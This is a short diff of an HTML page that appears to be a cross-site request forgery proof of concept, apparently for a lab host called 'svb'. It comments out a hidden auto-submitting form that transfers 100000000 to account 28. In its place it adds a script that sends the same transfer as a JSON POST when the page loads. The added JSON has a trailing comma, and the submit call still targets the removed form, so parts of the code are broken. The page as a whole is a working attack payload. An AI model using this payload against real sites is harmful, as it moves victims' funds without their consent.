@@ -1,8 +1,17 @@
-<form id=form1 action="http://svb:5003/transfer/1" method="POST">
+<!-- <form id=form1 action="http://svb:5003/transfer/1" method="POST">
     <input type="hidden" name="account" value="28" />
     <input type="hidden" name="amount" value="100000000" />
-</form>
+</form> -->
 
 <script>
     document.getElementById('form1').submit();
+    let xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://svb:5003/transfer/1");
+    xhr.setRequestHeader("Accept", "application/json");
+    xhr.setRequestHeader("Content-Type", "application/json");
+    let data = `{
+    "account": 28,
+    "amount": 100000000,
+    }`;
+    xhr.send(data);
 </script>
